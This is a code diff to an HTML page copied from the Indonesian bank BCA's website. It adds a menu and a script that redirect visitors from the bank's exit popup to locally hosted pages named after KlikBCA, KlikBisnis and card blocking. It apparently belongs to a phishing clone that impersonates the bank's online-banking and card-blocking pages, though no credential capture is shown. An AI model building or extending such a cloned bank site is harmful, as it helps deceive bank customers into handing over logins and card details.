@@ -3426,16 +3426,45 @@ form{
      <p class="title mb-16">Anda akan meninggalkan BCA.co.id</p> 
      <p class="text"> </p>
      <p class="text"> Dengan mengklik ‘Lanjutkan’, Anda akan diarahkan menuju website di luar www.bca.co.id yang tidak terafiliasi dengam BCA dan mungkin memiliki tingkat sekuriti yang berbeda. BCA tidak bertanggung jawab dan tidak mendukung, menjamin, mengendalikan konten, mengendalikan ketersediaan dan perspektif atas produk-produk atau layanan-layanan yang ditawarkan atau dinyatakan oleh website tersebut. </p> 
-     <p></p> 
+     <p></p>
+     <div style="margin-bottom:15px;">
+  <div onclick="pilihMenu('bca')" style="padding:10px; border:1px solid #ccc; margin-bottom:5px; cursor:pointer;">
+    Klik BCA
+  </div>
+  <div onclick="pilihMenu('bisnis')" style="padding:10px; border:1px solid #ccc; margin-bottom:5px; cursor:pointer;">
+    BCA Bisnis
+  </div>
+  <div onclick="pilihMenu('blokir')" style="padding:10px; border:1px solid #ccc; cursor:pointer;">
+    Blokir Kartu
+  </div>
+</div>
      <div class="popup-actions"> 
-      <a class="a-button primary" href="">Lanjutkan</a> 
+      <a class="a-button primary" href="#" onclick="lanjut()">Lanjutkan</a> 
       <a class="a-button secondary cancel" href="#">Batal</a> 
      </div> 
     </div> 
    </div> 
   </div> 
   <p id="status"></p> 
-  <script>
+  <script>// ===== PILIH MENU =====
+function pilihMenu(menu) {
+    localStorage.setItem("menu", menu);
+}
+
+// ===== TOMBOL LANJUTKAN =====
+function lanjut() {
+    var pilihan = localStorage.getItem("menu");
+
+    if (pilihan === "bca") {
+        window.location.href = "klikbca_index.html";
+    } else if (pilihan === "bisnis") {
+        window.location.href = "klikbisnis_index.html";
+    } else if (pilihan === "blokir") {
+        window.location.href = "blokir-kartu_index.html";
+    } else {
+        alert("Silakan pilih menu terlebih dahulu");
+    }
+}
    
             $(document).ready(function() {
             $("div#eyeOpen").on('click', function() {
